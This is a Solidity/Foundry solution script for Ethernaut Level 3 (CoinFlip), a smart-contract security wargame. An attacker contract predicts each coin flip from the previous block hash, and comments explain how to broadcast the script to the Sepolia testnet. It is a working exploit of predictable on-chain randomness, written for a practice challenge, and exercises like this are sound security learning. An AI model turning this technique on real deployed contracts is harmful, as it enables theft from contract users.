// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/Coinflip.sol";

/*
    Solution script for the Ethernaut Level 3: CoinFlip

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in CoinFlipScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    NOTE: since this script needs to be run 10 times you can add
    a --password option with your keystore password so its easy to run the script each time!

    ```
    cast wallet import auditor --interactive

    forge script script/CoinFlip.s.sol:CoinFlipScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        --broadcast \
        --password <YOUR-KEYSTORE-PASSWORD> \
        -vvvv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/CoinFlip.s.sol/11155111
*/

contract Attacker {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlipInstance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinFlipInstance.flip(side);
    }
}

contract CoinFlipScript is Script {
    // replace instance with your level1 instance adddress
    address payable instance = payable(0x6e189c9A13318F158eC6D7dA9791B3272836Fd84);
    CoinFlip public level3 = CoinFlip(instance);

    function run() external {
        vm.startBroadcast();

        new Attacker(level3);
        console.log("consecutiveWins: ", level3.consecutiveWins());

        vm.stopBroadcast();
    }
}